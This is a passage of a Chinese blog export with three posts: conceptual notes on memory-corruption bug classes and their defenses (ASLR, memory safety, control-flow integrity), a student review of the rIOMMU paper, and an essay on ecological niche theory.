第二种:它所指向的对象已经被释放(dangling pointer)，temporal error Bugs lead to Out-of-bounds: allocation failure --&gt; null pointer 过多的增／减 array pointer --&gt; buffer overflow/underflow indexing bugs --&gt; pointer 指向任意位置 Bugs lead to dangling: objects释放了，但指向它的指针没有释放 (大多数objects在堆上，但堆栈上多objects如果用了全局的pointer，也会出现dangling pointer) Step 2: dereferences the pointer dereferences the pointer: 读/写 Step 3: corruption/leakage of data Out-Of-Bounds read from memory pointer指向了攻击者控制的位置，那么取的值就被攻击者操纵了 指针指向控制相关的数据，现在攻击者将它指向了恶意的转移目标 --&gt; divert control-flow 指针指向输出数据，现在攻击者将它指向了一些隐私数据 --&gt; leaks information write to memory pointer指向写的地址，那么攻击者就能够篡改内存中的任意数据 篡改一个控制相关的变量，例如vtable，返回地址 --&gt; divert control-flow 篡改一个输出的地址(另一个指针) --&gt; leaks information Dangling pointer 由deallocated object释放的memory，会被另一个object重新使用，而两种object的type是不同的，因此新的object会被解释为旧的object。 read from memory 旧的object的vpointer --&gt; divert control-flow 新的object中敏感数据可用旧的object输出 --&gt; leaks information write to memory 旧的object在栈上 --&gt; divert control-flow(return address) double-free leads to double-alloc --&gt; arbitraty wirtes attack type 控制流劫持: divert control-flow data-only攻击: gain more control,gain privileges Information leak: leaks information Protections Probabilistic: Randomization/encryption Deterministic: Memory Safety/Control-flow Integrity 其中Deterministic protections又可以分为hardware/software两种。其中，software的方法，可以通过静态/动态两种插桩方式来实现。 Probabilitic Methods Probabilitic Method依赖于随机化，包括有: Address Space Randomization:代码和数据段的位置，在W⊕X后，主要应用于code。 Data Space Randomization:对所有的变量进行加密。 Deterministic Methods Memory Safety 空间安全-指针边界:指针能指向的地址范围 空间安全-对象边界:对象的地址范围，比指针边界的兼容性更好 时序安全-特殊的allocators:申请内存时避免use-after-free，例如只使用相同类型的memory 时序安全-基于对象:在shadow memory中标记释放内存，但如果这段内存被重新申请则无效 时序安全-基于指针:在内存释放/申请时，更新指针信息 Generic Attatck Defenses Data Integrity 不关注时序安全，只保护memory写，不保护memory读。 safe objects integrity:分析出不安全的指针和对象，利用shadow memory记录对应关系 points-to sets integrity:分析出不安全的指针和对象，限制其points-to set的对应关系 Data-Flow Integrity 通过检查read指令，检测任何数据的corruption(上一次write是否合法)，同样使用ID和set的方式。 Control-Flow Hijack Defenses Code Pointer Integrity 防止Code Pointer被篡改，例如对Code pointer进行加密等。 Control Flow Integrity 动态return integrity:对返回值进行保护，如shadow stacks。 static CFI:求出控制流转移的集合，在运行时检查控制流转移是否合法。 本文链接： http://www.meng.uno/articles/9c8c0fa/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"}],"tags":[{"name":"内存","slug":"内存","permalink":"http://www.meng.uno/tags/内存/"},{"name":"底层安全","slug":"底层安全","permalink":"http://www.meng.uno/tags/底层安全/"},{"name":"二进制","slug":"二进制","permalink":"http://www.meng.uno/tags/二进制/"}]},{"title":"rIOMMU：Efficient IOMMU for I/O Devices that Employ Ring Buffers","slug":"rIOMMU","date":"2016-06-22T12:28:00.000Z","updated":"2018-02-18T13:26:25.629Z","comments":true,"path":"articles/51c782dd/","link":"","permalink":"http://www.meng.uno/articles/51c782dd/","excerpt":"文章内容理解 作者写作背景 在I/O设备开始与CPU异步直接与主存交换信息（DMA时代）开始时，DMA使用物理地址直接存取，这就给系统带来了很多诸如劣质甚至恶意设备影响，造成系统崩溃……等麻烦，在这种情况下，对I/O设备的存取统一管理的单元——输入输出存储管理单元（IOMMU）应运而生。随着设备带宽的提高，那些像网卡和PCIe SSD控制器等高带宽设备可以与系统通过一个环型缓冲器相互影响，于是一种带有环形的缓冲器能够分层、平滑地替换虚拟地址的rIOMMU成了研究的重点。这种rIOMMU能高达7.56倍地提高普通IOMMU的效率，是没有IOMMU的0.77—1.00倍。 文章结构 该文章从以下","text":"文章内容理解 作者写作背景 在I/O设备开始与CPU异步直接与主存交换信息（DMA时代）开始时，DMA使用物理地址直接存取，这就给系统带来了很多诸如劣质甚至恶意设备影响，造成系统崩溃……等麻烦，在这种情况下，对I/O设备的存取统一管理的单元——输入输出存储管理单元（IOMMU）应运而生。随着设备带宽的提高，那些像网卡和PCIe SSD控制器等高带宽设备可以与系统通过一个环型缓冲器相互影响，于是一种带有环形的缓冲器能够分层、平滑地替换虚拟地址的rIOMMU成了研究的重点。这种rIOMMU能高达7.56倍地提高普通IOMMU的效率，是没有IOMMU的0.77—1.00倍。 文章结构 该文章从以下七个部分论述： 摘要：简述本次论文的主要内容； 介绍：向读者介绍什么是IOMMU以及什么是Riommu其他缩写的概念； 背景：在什么情况下，作者提出用rIOMMU改进原有IOMMU的： 首先讲OS的DMA保护； 接着讲IOMMU的设计与提升作用； 最后提出rIOMMU的概念。 安全代价：讲解OS与IO设备的关系与保护方式 设计：这是作者主要论述的部分，也是本文的核心，从以下三个方面论述： 数据结构 硬件实现 软件实现 评估：从7个模式分别测试该设计的可行性，又分为方法与结果两个部分论述 总结 下面直接进入文章的设计部分： 数据结构 作者从软件、硬件两种方式来组合实现rIOMMU,所以数据结构不得不是最先介绍的东西了。我将以代码与文字结合的方式介绍： 以上四个结构体所展示的数据结构，都是硬件软件公用的，他们都被rIOMMU用来转换虚拟地址，被操作系统调用。接下来定义一个只有硬件会使用的结构体： ## 硬件处理 首先，在与rRING相连的rIOTLB_entry的IOVA中寻找e，如果e不存在rIOMMU就搜索表，用上面定义的数据结构，找到rPTE，并插入rIOTLB一个匹配的entry，同时使表移动确保e.rpte是rPTE中给定的rIOVA。 其次，如果e已经初始化在rIOTLB被找到，rIOMMU匹配每一个IOVA和e，并且实时更新e。 然后，检查IOVA.offset如果出错，会造成rIOMMU启动I/O默认页（IOPF）,当然这并不是所希望的，未出错时，最终该offset会加到rPTE.phys_addr上形成虚拟地址的转换。 最后还有关于错误的一些处理，在此不再赘述。 软件处理 说完了硬件上的处理，接下来该软件上的操作了，说是软件其实就是设备的驱动程序、映射函数等底层的软件，这部分的处理和Linux中IOMMU的基准处理相似。 这一部分主要是处理映射的问题，具体就是将数据结构中定义的每个结构体的各个域之间建立联系。映射给每个设备一个ring ID，一个映射的物理地址，它包含两个部分： 在ring的尾部分配一个环入口rPTE，然后更新上面数据结构提到的tail/nmapped域； 当rPTE初始化后，首先确保其内容更新对rIOMMU是可见的，它的返回状态是入口的索引，而且这个ring ID是由IOVA所得到的。 这一部分也同样有错误处理，在此不再赘述。 可行性分析 可行性评估 在读了这一篇关于优化IOMMU的文章后，我在网上寻找了一下，相关的研究进展情况，发现早在很多年前像Intel、AMD等处理器生产商早就有关于IOMMU的应用，但是在像本文所讲的rIOMMU还没有得到应用过，也就是说文章现在所言皆是理想的情况。 在文章的后半部分，作者也从“方法”、“实验执行”、“基准”等方面做了很多测试，其中在“方法”模块采用：①strict，②strict+，③defer，④defer+，⑤riommu-，⑥riommu，⑦none其中模式，可以说是比较准确的了下图及下表展示所有测试结果： 通过结果可见，当运行“需求-响应”（RR）模式是，相对于普通IOMMU，提升不是多么的明显，但是在其他方面，结果还是挺理想的。 创新之处 作者在测试部分将模拟方法分成7个等级，基本上模拟了所有的正常可能情况，有力证明了本次实验的成功。 作者在进行设计之初，分析了现有的DMA与IOMMU，然后提出自己的设计，使我们对总体设计有一个整体认识，也使的作者的设计比较容易接受。 在设计上，作者不仅考虑到硬件，同时对软件也进行了设计，而且设计过程相当明细，用实际的代码来解释，使设计极具可行性。 设计存在的不足分析 我认为作者在设计时并未考虑这样设计所带来的结构复杂性，也未对实际的能耗做评估，也许可能会由于总线分配问题而没法嵌入系统。 作者虽然提到rIOMMU在对有错误的DMA设备的保护的作用，但是没有给出具体的保护方案。 我想到既然通过环形缓冲器能解决速度的问题，那么会不会带来其他的弊端，例如：某次传输没有传输完就被后一次的覆盖掉或者当环形缓冲器中有错误，没法处理时会不会发生DMA总是在那里占用总线而又没有实际的数据传输。 既然是环形缓冲器，那么当传输数据是暂时性的，而且又没能在有效的时间范围内进入环形缓冲器，那么是不是就有冲掉的风险。 针对不足的改进意见 在上一部分我浅显地提出了自己认为是不足的地方，在此仅仅做些自己认为合理的改进意见。不能保证我的观点是完全正确，但是这确实是我自己对相关问题的认识所得。 作者可以增加关于能耗的测试，作者提到这样的rIOMMU确实在某些方面比IOMM要有效得多，但是能耗是不是也如此呢？作者应该往这方面做些必要的测试（由于水平有限，所以只能借助作者之手完成这项测试）。 既然rIOMMU对设备有保护作用，那么其作用具体体现在哪呢？仅仅是在对错误数据的处理上，远远不足以满足现在设备的要求，例如，当某设备出错，重复发送某信息时，作为向主存传输信息的接口，应该如何处理呢？我认为可以从软件上进行相关判断，我觉得这将是这类IOMMU值得改进的地方。 我觉得环缓冲器还应该增加错误信息清除能力，当出现出错信息时，能有效地将其清除并且不影响其他设备的正常传输。 每个环形缓冲器都会有数量“size”的限制，像用尽这种现象应该是尽量避免的。也许可以通过取一个大大的“buffer”值来基本解决这一问题，但是将造成空间消耗严重，我觉得更好的解决办法是，修改设计，使设计能够容纳多个环缓冲器，当然不是每个环每次都会使用，当第一个环占满并且还有数据需要缓冲时，才会调用第二个环……在这种设计上，我觉得将会增加很多判断，设计空间的动态分配等问题。 附录 在此将本文所有用到的英文缩写做一下梳理： IOMMU: Input/Output Memory Management Unit 输入输出存储管理单元 rIOMMU: IOMMU Employed Ring Buffers 带环缓冲器的IOMMU IOTLB: I/O Translation Lookaside Buffer 用于IOMMU的块表 IOVA: I/O Visual Address IO虚拟地址 本文链接： http://www.meng.uno/articles/51c782dd/ 欢迎转载！","categories":[{"name":"计算机组成","slug":"计算机组成","permalink":"http://www.meng.uno/categories/计算机组成/"},{"name":"IOMMU","slug":"计算机组成/IOMMU","permalink":"http://www.meng.uno/categories/计算机组成/IOMMU/"}],"tags":[{"name":"IOMMU","slug":"IOMMU","permalink":"http://www.meng.uno/tags/IOMMU/"},{"name":"Buffer","slug":"Buffer","permalink":"http://www.meng.uno/tags/Buffer/"}]},{"title":"生态位之我见","slug":"eco","date":"2016-06-18T16:01:11.000Z","updated":"2018-03-18T07:37:44.330Z","comments":true,"path":"articles/85c6ef64/","link":"","permalink":"http://www.meng.uno/articles/85c6ef64/","excerpt":"生态位已是国内外生态学领域广泛使用的术语和研究热点 。自进入 20 世纪 90 年代以来, 生态位 ( niche) 这一概念在生态学界受到了前所未有的关注, 这是继 20 世纪 70 年代生态位理论研究热之后的第 2 个发展高潮。由于物种多样性、物种竞争、群落结构和功能及演替与种群进化、群落物种积聚原理都以生态位理论为基础, 因此生态位理论逐渐成为生态学中重要的基础理论之一, 受到了国内外学者的广泛重视。然而, 令人遗憾的是迄今为止在生态位研究领域尚未形成一套系统完整的为各国学者所共同接受的理论框架, 许多学者也对生态位的概念长期争论不休, 所以对生态位的定义也是多样化的。现将生态位理论及其","text":"生态位已是国内外生态学领域广泛使用的术语和研究热点 。自进入 20 世纪 90 年代以来, 生态位 ( niche) 这一概念在生态学界受到了前所未有的关注, 这是继 20 世纪 70 年代生态位理论研究热之后的第 2 个发展高潮。由于物种多样性、物种竞争、群落结构和功能及演替与种群进化、群落物种积聚原理都以生态位理论为基础, 因此生态位理论逐渐成为生态学中重要的基础理论之一, 受到了国内外学者的广泛重视。然而, 令人遗憾的是迄今为止在生态位研究领域尚未形成一套系统完整的为各国学者所共同接受的理论框架, 许多学者也对生态位的概念长期争论不休, 所以对生态位的定义也是多样化的。现将生态位理论及其在植物种群研究中的应用现状加以综述, 以便为今后的研究提供有益参考。 生态位理论及其发展 早在 1894 年密执安大学的 Streere 在解释鸟类物种分离而居于菲律宾各岛现象时对生态位就很感兴趣, 但未作任何解释。1910 年, Johnson 最早使用了生态位一词:同一地区的不同物种可以占据环境中的不同生态位 。 可惜他没有对生态位进行定义, 未将其发展成一个完整的概念。Grinnell ( 1917, 1924, 1928) 在研究加利福尼亚长尾鸣禽的生态关系时使用生态位术语并首次给以定义, 他把生态位定义为：恰好被一个种或一个亚种所占据的最后分布单位( ultimate distributional unit) 。这一定义虽然注意到了种的结构和功能上的作用, 但更加强调种的空间分布的意义, 因此被称为空间生态位 。动物生态学家 Charles Elton( 1927) 认为:一种动物的生态位表明它在生物环境中的地位及其与食物和天敌的关系。以后他又说过: 一个动物的生态位在很大程度上决定于它的大小和取食习性。他给生态位下的定义是：指物种在生物群落中的地位和角色 。他特别强调物种在群落营养关系中的角色, 后人将他的定义称为：功能生态位 。 20 世纪 30 年代和 40年代, 关于生态位概念的研究处于相对沉寂时期。直到 50年代, 对生态位的概念研究重新升温, Odum( 1952) 认为, 生态位不仅包括有机体的群落类型、生境和物理条件, 而且还包括某些它与群落所有其他成分有关的要素, 它本身在群落动态中所起的作用。Hutchinson( 1957) 引入数学中点集理论, 把生态位看作是一个生物单位( 个体、种群或物种) 生存条件的总集合体 。他从空间、资源利用等多方面考虑, 对生态位概念予以数学的抽象, 提出了生态位的多维超体积模式。所谓的多维资源空间的超体积, 这不仅包含了原来的物理分布空间, 而且还包括温度、湿度、pH 值等衡量其栖息地的一些其它指标。Hutchinson 后来在此基础上提出了基础生态位和现实生态位两个概念。多维超体积概念为现代生态位理论研究奠定了基础。 1959 年 Odum 把生态位定义为：一个物种在群落和生态系统中的位置和状态, 而这种位置和状态则决定了该生物的形态适应、生理反应和特有行为。他曾强调指出: 一个生物的生态位不仅决定于它生活在什么地方, 而且决定于它干些什么。Odum 曾形象地将栖息地比喻为是生物的住址, 而将生态位比喻为生物的职业。Whittaker ( 1973)等把前人关于生态位的概念归纳为三个涵义, 即一个物种在群落中所起的功能位置或角色( 功能的涵义) ; 反映种在群落中的分布关系( 生境的涵义) ; 上述两者概念的结合即功能与生境( 利用的资源) 结合起来的涵义 。May ( 1976) 把生态位概括为某物种究竟怎样生活在地球上的诸生态因子中。而有的植物学家( 如 Grubb, 1977) 视生态位为植物与所处环境的总关系 。Pianka( 1983) 认为一个生物单位( 个体, 种群或物种) 的生态位就是该生物单位适应性的总和 。王刚等( 1984) 对哈奇森的工作进行了改进, 给出了生态位的一个广义定义: 一个种的生态位是表征环境属性特征的向量集到表征种的属性特征的数集上的映射关系。 Colinvaux( 1986) 提出物种生态位的概念, 即生态位是物种为了满足获得资源、生存机会和竞争能力等一系列需要所具有的特殊能力。在前人研究的基础上, 刘建国和马世俊等( 1990) 提出了扩展的生态位理论, 根据生态位的存在与非存在形式, 以及生态位的实际和潜在被利用状态可将生态位分为存在生态位( 包括实际生态位和潜在生态位) 和非存在生态位, 他们认为生态位是在生态因子变化范围内, 能够被生态元实际和潜在占据、利用或适应的部分, 拓展了生态位的研究范围 。Mathew A Leibold ( 1995) 从生物对环境需求与影响的角度, 提出需求生态位与影响生态位及由以上两者结合形成总生态位。Whittaker 首先将生态位理论应用于研究森林生态学中 。 张光明等认为生态位所描述的主体对象实践上应该是种群; 生态位本质上是指物种在特定尺度下在特定生态环境中的职能地位, 包括物种对环境的要求和影响两个方面及其规律; 离开尺度去谈生态位没有真正价值。他们认为一定生态环境里的某种生物在其入侵、定居、繁衍、发展以至衰退、消亡历程的每个时段上的全部生态学过程中所具有的功能地位, 称为该物种在该生态环境中的生态位。 朱春全 ( 1997) 在提出生态位的态势理论与扩充假说时认为生态位应当包含两个方面: 一是生物单元的态, 二是生物单元的势, 生物单元的生态位是该生物单元态和势之和与所有被研究的生物单元态和势之和的比值, 即生态位是生物单元在特定生态系统中与环境相互作用过程中所形成的相对地位与作用。他认为前人的研究均是从生物单元的生态环境方面来表述其生态位的, 然而, 对于任何生物单元的研究都是对特定时刻、特定生物群体的状态描述, 当前实际占据环境部分不能反映该生物单元所经历的环境变化的所有特征, 而且, 生物单元所占据的生态因子范围受多种随机因素的影响, 因此, 特定时刻某生物单元所占据的环境范围对于该生物单元的生态作用没有实际意义。 由以上不难看出, 不同的学者对生态位的定义并不统一。但尤以 Grinnell 的空间生态位、Elton 的功能生态和Hutchinson的多维超体积生态位最具代表性。Whittaker等曾对各家定义做出类似的划分。朱春全提出的态势理论具有普适性, 并且综合了生命系统所具有的共性, 既适用于人类社会, 也适用于其它所有的生命类群, 是自然科学和社会科学的高度综合 。现代生态位理论是以 Hutchinson 的多维超体积概念为基础的,但至今尚未形成一个使广大生态学者公认、堪可适用的生态位概念及其理论体系。 生态位理论在植物种群研究中的应用 生态位理论对于认识植物种群种内或种间竞争具有重大意义。 竞争排斥现象是普遍存在的, 如森林中常见的自然稀疏现象 , 生态位重叠既可以体现种群对环境资源的利用状况, 又能反映种群间分布地段的交错程度 。生态特征相似或具有近相似环境要求的植物种群, 在群落中生态位重叠较大 。生态位宽度较大的种群由于对资源利用能力较强, 分布较广而与其它种群间的生态位重叠较大; 生态位宽度较小的种群与其它种群的生态位重叠较小; 但具有较大生态位宽度的种群之间的生态位重叠并不一定高, 具有较小生态位宽度的种群之间的生态位重叠并不一定低; 究其原因, 可能是这些种群由于它们之间的利用性竞争而使它们经常出现在一起, 例如不同层次的树种, 对光要求是不同的。同一层次的种群具有较高的生态位重叠值, 其结果是由于利用性竞争引起还是由于干扰性竞争引起的, 这要根据具体情况而定, 有的学者指出生态位重叠只与利用性竞争有关而与干扰性竞争无关。这也许与森林类型有关, 如热带森林跟温带森林情况可能就会不一样。 刘金福 等在研究格氏栲林主要种群生态位时认为对重叠较大的种群存在两种可能: 一是树种间共享资源的同时存在竞争关系, 二是树种间资源利用相似的同时彼此促进关系。奚为民 认为生态位重叠作为衡量种间生态相似性的指标和种间竞争存在着一定的联系, 生态位重叠和竞争之间经常可能是一种相反的关系, 广泛的重叠实际上可能与减低竞争相关联。有学者认为生态位互利性重叠现象在自然界中是不存在的。还有学者认为种群间的正联结性越强其生态位重叠值就大, 种群间的负联结性越强则重叠值就越小。林思祖等将生态位重叠与竞争的关系归纳为三点: 生态位重叠与竞争成正相关; 生态位重叠与竞争成负相关; 生态位重叠与竞争不成相关; 他认为生态位重叠与竞争的关系在很大程度上受种群间的生物学特性的左右。 奚为民 认为具有较宽生态位的植物种群, 其一定具有较强的生态适应性, 因而生存机会多, 分布范围也较广; 反之则生存机会少, 分布范围也较窄。丁易 等却认为当资源供应不足时, 作为利用资源多样化的泛化物种( 即生态位较宽的物种) 具有更强的生态适应、更广的分布范围和更大的存活机会, 当资源供应丰富时, 在局域小生境范围内, 特化物种( 即生态位较窄的物种) 具有更高的资源利用效率, 其竞争能力强于泛化物种。 生态位理论对于指导林业生产和植物种群改良具有实践意义。 生态位重叠与种群竞争的关系是一个十分复杂的问题, 在林业上种间配置时, 我们应该要考虑各个种群的生态位宽度、种群之间的生态位相似性比例和生态位重叠, 以及它们之间是否有利用性竞争的生态关系, 如果是竞争性的生态关系, 那么至少要求将某一维度的资源不要重叠。总之, 我们要使所建立的人工群落处与一种高度和谐的系统之中。在植物种群改良时, 我们应充分考虑到种群的生态特征, 避免引入种与原有种之间产生较大的生态位重叠, 防止种群间出现激烈竞争; 建立引入种的最适生长环境, 获取优势生长, 使各种群均能有效地利用资源, 提高群落的初级生长力。 郭全邦等认为基础生态位宽的种群能在严酷的生境中生存, 基础生态位窄的种群适宜于生长在资源丰富、群落结构复杂的生境中。因此, 在荒地上建造植被, 或改善恶劣的环境, 一般应选择基础生态位较宽的种群; 为了加快植被的演替或搞种群配置, 则应合理地选择, 引入基础生态位较窄的种群。林思祖等认为不同资源空间的主要种群生态位宽度发生变化, 说明了不同资源的物种生态适应性不同。综上所述, 在林业生产上, 我们应该既要考虑到种群间的竞争排斥原理, 又要考虑到种群生态位宽度对植物生存的影响。 生态位理论是解释森林群落演替动态的方法之一 种群的资源利用能力是种群分布与群落演替的内在动力。随着群落的发展或演替, 种群的生态位宽度会发生变化, 通过不同时期进行种群生态位宽度的测定, 可以深入了解整个群落的发展动态。实际生态位可用于种内、种间的比较, 作为基础生态位研究的资料, 也可用于探索种群和群落的动因等; 基础生态位不同于原始生态位( 即竞争前生态位或生理幅度) , 可为群落结构和动态的研究提供线索。在群落演替过程中, 当种群大小与资源的可利用程度相对平衡时, 资源可满足种群的需要而使其稳定, 不表现出生态位释放和压缩; 当种群大小超过资源的可利用程度时, 资源短缺, 种群衰退。同时, 种群的增长将加快它对环境的影响, 资源的耗损加速, 限制其原有种群的发展, 压缩其实际生态位, 为其他物种的生态位释放奠定基础。 吴大荣 研究福建罗卜岩闽楠林优势树种生态位后发现: 大部分的常绿阔叶树种具有较大的生态位宽度值, 而落叶阔叶树种则呈现较小的生态位宽度值。这一研究结果有助于理解由落叶阔叶树种为主的常绿落叶阔叶林向中亚热带典型常绿阔叶林演替过程中优势种群的生态适应性变化规律。吴明作 等通过研究河南栓皮栎林主要种群的生态位后发现, 随着资源轴的增加, 总的生态位宽度减小; 说明了多维资源轴利用中, 基础生态位中可实现的部分减少, 其原因有待进一步研究。 小结 从Grinnell( 1917) 首次给出生态位的定义到现在, 生态位理论取得了长足的发展。现代生态位理论的研究集中在生态位重叠、生态位宽度和生态位相似性比例等生态位测度的定量研究上。我国许多学者自 80年代以来对生态位理论进行了大量卓有成效的研究, 如刘建国( 1990) 提出的扩展的生态位理论、朱春全( 1997) 提出的生态位态势理论与扩充假说等等。虽然至今为止尚未形成一个使广大生态学者公认、堪可适用的生态位理论, 但生态位理论已经受到国内外广大生态学者的特别关注, 发展前景广阔。生态位理论很有希望发展成为既贯穿于生态学各理论分支之中又自成体系的重要的生态学基础理论之一。 生态位与植物种群是一一对应的, 某一特定的植物种群要求某一特定的生态位, 反过来某一特定的生态位只能容纳某一特定的植物种群 。生态位理论在植物种群生态学的定量研究中具有现实意义 。 生态位理论在植物种群研究中有重要而广泛的应用, 通过对植物种群之间生态位重叠、生态位相似性比例及生态位宽度的计算, 可以使我们更深入地认识植物种群内或种间的竞争, 这对我们深入理解植物种群在群落中的地位和作用也提供了帮助。生态位理论对于我们林业生产和种群改良也具有重要的现实指导意义, 它为解释森林群落演替动态机理提供了一个重要方法。 浅显的认识 由于人口的急剧增多, 城建规划不合理, 建筑家随心所欲地建造房屋, 城市在时间上、空间上不断改变着面貌, 出现了一系列影响人民生活、工作, 影响经济持续、稳定、协调发展的生态问题。生态位已是国内外生态学领域广泛使用的术语和研究热点 。从Grinnell( 1917) 首次给出生态位的定义到现在, 生态位理论取得了长足的发展。生态位不仅包括有机体的群落类型、 生境和物理条件 , 而且还包括某些它与群落所有其它成分有关的要素 ,它本身在群落动态中所起的作用。 生态位数量 生态位的数量与生态系统的气候，地理和生物因素有关。相应的物种数会因这些因素的差异导致有很大的不同。极地，例如格陵兰的冰川，南极洲或是高原的生态位数就不及热带的原始森林或是珊瑚礁的多。 生态位分化的重要性 生态位虽然定义多样，但单单就其字面意思理解，即为：生物在环境中所占据的位置。每个生物因为位置不同，所养成的生活习性，等等都有所不同。于是研究生态位十分有必要。生态位分化对物种共存和群落构建有着重要的作用,同时前人研究结果表明了整合生态位理论和中性理论来解释群落物种多样性分布格局的必要性。如果物种间存在竞争能力差异而且没有生态位分化,那么系统将会很快发生竞争排除并到达平衡状态,即竞争能力最强的物种将排除掉其他物种,并且系统的平衡点是全局稳定的,即不论物种的初始多度是多少(除了0之外),系统最终将达到平衡状态。更新限制和扩散限制能够在一定程度上延缓竞争排除,但是跟Hurtt和Pacala(1995)的研究结果相比,其作用范围相当有限。实际上,即使种间微弱的竞争能力差异,也需要极端的更新限制和扩散限制才能延缓竞争排除。 生态位分化在森林中的应用 在森林功能发育过程中,生态位分化表现为稳定下降,而物种扩散则为前期不变,后期稳定下降.群落功能发育尺度上的物种扩散伴随了冠层稳定的骨架结构及分离的垂直结构,提高了垂直分布上群落物种组成的匀质性,有利于物种共存.局域尺度上,物种扩散与生态位分化过程的交互效应是群落构建的主要动力,物种扩散作用要强于生态位分化过程.本研究暗示除了空间因子等的被动调节,中性与生态位过程对群落构建的相对贡献也受群落功能发育阶段的影响,群落构建驱动力受群落自身功能的调节。 生态位分化对物种多样性维持的重要性 生态位理论强调确定性过程在群落构建中起决定性作用,而中性理论则强调随机性过程的重要性。实际上,二者关于确定性和随机性在群落构建中的相对重要性的争论已经持续了一个多世纪。许多研究表明,生态位理论和中性理论都有不少支持和否定的证据。因此,生态学家们尝试整合生态位理论和中性理论来解释群落物种多样性分布格局。 群落生态学中生态位理论的重要性 在群落生态学中有关生态位(niche)概念描述“生态位就是指动物在群落中的地位,食物和天敌的关系”,所谓地位是指动物在空间或时间上所占的特殊位置,它与食物和天敌的关系是指动物在群落中的作用。 空间生态位宽度值的大小的意义 空间生态位宽度值的大小反映的是物种在空间维度上分布范围的大小。宽度值越大，意味着生物能在较大的空间范围内生存，进而如果环境变化，对其产生的影响就小。一个物种的时空生态位宽度值一定时 , 其时间生态位宽度值最大 , 并非空间生态位的宽度值也是最大 。 生态位重叠的意义 时间生态位重叠反映的是不同物种对资源利用在时间维度上的相似程度。空间生态位重叠反映的是不同物种对资源利用在空间维度上的相似程度 。时间和空间生态位重叠反映的是时间和空间单因素情况下物种间的生态位重叠 , 时空二维生态位重叠计算采用时间生态位重叠与空间生态位重叠的乘积效果较好。时空二维生态位宽度值较大的种类与相对重要性指数较大的种类有着明显的差异 。 生态位重叠与竞争的关系 种群间的生态位重叠与竞争的关系一直为生态学家们所关注。最典型的是生态位重叠被借用作为著名的 Lotke-volterva竞争方程的竞争系数 。但是实际上生态位重叠值绝不能与竞争程度等同。这是由于目前种间生态位重叠值基本上只是某个或几个生态因子梯度上的度量值 , 而影响物种的生长发育的生态因子众多 , 很难对所有因子进行生态位重叠的计测。例如 , 种 A和种 B在 X维度上完全重叠 , 但是在 Y维度上可能分割而避免了竞争 。 彭少麟等在研究鼎湖山森林群落优势种群生态位重叠时也指出 , 椎栗、 木荷等种群作为上层木 , 柏拉木作为第 4层的灌木 , 两者在水平空间维度上可以是重叠的 , 但在垂直空间维度上的分割 , 使其对光能的利用具有互补作用而无竞争意义。甚至由于中生性小乔木需要一定的荫蔽度 , 则它与大乔木在水平空间维度上的生态位重叠不仅不是竞争 , 反而是一种惠利。 然而 , 如果在 n维空间上均重叠的种对 , 必定或多或少有竞争 , 其生态位重叠值可以基本与竞争程度等同。 因此 , 在应用生态位重叠作为竞争系数时必须谨慎考虑。 生态位理论在森林资源评价中的应用 对森林资源的分析与评价在现有林经营管理中占据着重要地位。无论是对区域森林资源总体的宏观决策, 还是对具体林分的经营对策, 都是以通过森林资源分析所提供的信息为基础。利用空间生态位理论对森林资源进行分析评价, 把森林资源作为一个生态系统, 将组成森林资源的各树种( 组) 在生态系统中的空间位置、分布方式、分布范围和数量, 以及增长或消减趋势有序地表达出来, 并与森林生态系统的演替、进化与衰退状况耦和在一起, 从而反映出森林群落的演替动态及趋势, 达到对森林资源进行有效地评价的目的。 任青山等采用空间生态位理论的分析方法, 对黑龙江省东部典型天然次生林和接近原始阔叶红松林两个区域的森林类型的主要种群的空间生态位宽度和地理矩进行了定量测定, 并对森林资源进行了空间生态位的划分, 从而反映出森林群落的演替动态及趋势。 生态位理论在城市生态学中的应用 经过 80多年的发展, 生态位的概念及其理论正日趋完善, 已超越了生物学的范畴, 渗透到了许多领域。 其中, 把生态位理论应用于城市的研究是值得深入探讨的课题之一。 王如松将生态位理论应用于城市生态系统的研究。 他将城市生态位定义为: 一个城市或任何一种人类栖境给人类活动所提供的生态位是指它所提供给人们的或可被人们所利用的各种生态因子和生态关系的集合。建立在生态位概念基础上的生态位理论、方法应与城市生态系统的有生态位态势理论、生态位适宜度理论、生态势理论、生态位扩充理论、生态位重叠、分离理论。 罗小龙等以南京市为例, 将生态位及态势理论引入城乡结合部研究中, 分析了城乡生态位及其态势对于城乡结合部空间扩展的塑造作用。 虚拟生态位策略 企业生态资源状况对企业生态位具有决定意义，随着人类社会由工业社会迈向信息社会，企业生态资源概念的外延、内涵及其企业对生态资源的占有方式正在发生深刻的变化。在信息社会，知识将作为占主导地位的资源和生产要素而存在，企业之间的竞争主要不是自然资源和其它有形的资本的竞争，而是拥有知识和技术多少的竞争、知识创新的竞争。信息社会竞争的加剧和环境变化的加快，使得企业无法单纯依靠自己生态资源来满足市场的需要。虚拟生态位和生态资源的共享为企业的发展拓展了生态空间，虚拟生态位的实质是发挥自身优势，对外部资源和力量进行有效整合，拓展自己的生态资源，达到降低成本、提高竞争力的目的。所以，企业要善于利用和建立虚拟生态位，以丰富自己的生态资源，改善生存、竞争环境，从而占据有利的生态位。巨大的全球网络、信息的光速流动使得企业生态资源的共享简单而便捷。 对生态位研究，发展的一点建议 在如今这样一个变化极其迅速的社会，生态位已不仅仅是一个普通的生态学概念，他在生活的方方面面都发挥着不可或缺的作用。所以说，接下来的生态位理论研究应该多注重对学科交叉方面的研究，特别是与人有关的方面研究。 生态位理论发展展望 生态位理论的原理和方法可以贯穿和应用于生态学基础理论各个分支之中。当生态位理论同生物多样性保护、退化生态系统恢复与重建、生态系统可持续发展中的理论及其实践工作结合到一起时, 生态位理论或许会对生态学发展、对人类文明进步发挥出令人振奋的作用。 目前, 关于生态位理论仍存在许多令人迷惑的问题, 如生态位概念虽然已从生境生态位、功能生态位、超体积生态位发展到时间生态位, 但其表述庞杂含糊、莫衷一是, 需要经过充分讨论研究和必要的国际学术会议评价议定, 生态位的基础概念一旦明确统一, 生态位理论便会很快进一步丰富和成熟起来。 随着科学技术的不断进步及相关领域的发展, 将会拓宽生态位理论的研究范围, 再重新评价和发展以传统生态位理论为基础的其他理论。 本文链接： http://www.meng.uno/articles/85c6ef64/ 